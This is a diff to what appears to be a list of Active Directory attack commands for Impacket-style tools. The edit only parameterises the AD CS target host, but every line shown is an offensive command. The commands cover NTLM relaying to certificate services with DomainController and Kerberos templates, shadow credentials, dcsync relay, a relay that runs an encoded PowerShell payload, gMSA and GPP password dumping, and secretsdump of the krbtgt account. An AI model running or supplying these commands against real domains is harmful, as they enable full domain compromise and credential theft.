@@ -3,7 +3,7 @@ rbcd -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "
 rbcd -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
 describeTicket "$CCACHE_PATH"
 describeTicket "$KRB5CCNAME"
-ntlmrelayx -t "https://pki.$DOMAIN/certsrv/certfnsh.asp" -smb2support --adcs --template "KerberosAuthentication"
+ntlmrelayx -t "https://${ADCS_HOST:-pki.$DOMAIN}/certsrv/certfnsh.asp" -smb2support --adcs --template "KerberosAuthentication"
 ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
 ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
 ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'NIHIL-01$'
@@ -18,8 +18,8 @@ ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'powershell -e "$BASE64"'
 ntlmrelayx -t ldap://"$IP" --delegate-access --escalate-user "$USER"
 ntlmrelayx -t ldaps://"$IP" -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
 ntlmrelayx -6 -t ldaps://"$IP" -wh wpad."$DOMAIN" -l loot
-ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template DomainController
-ntlmrelayx -t http://"$IP"/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+ntlmrelayx -t http://"${ADCS_HOST:-$IP}"/certsrv/certfnsh.asp --adcs -smb2support --template DomainController
+ntlmrelayx -t http://"${ADCS_HOST:-$IP}"/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 Get-GPPPassword -debug -no-pass "$DC_HOST"
 Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 KRB5CCNAME="$CCACHE_PATH" secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
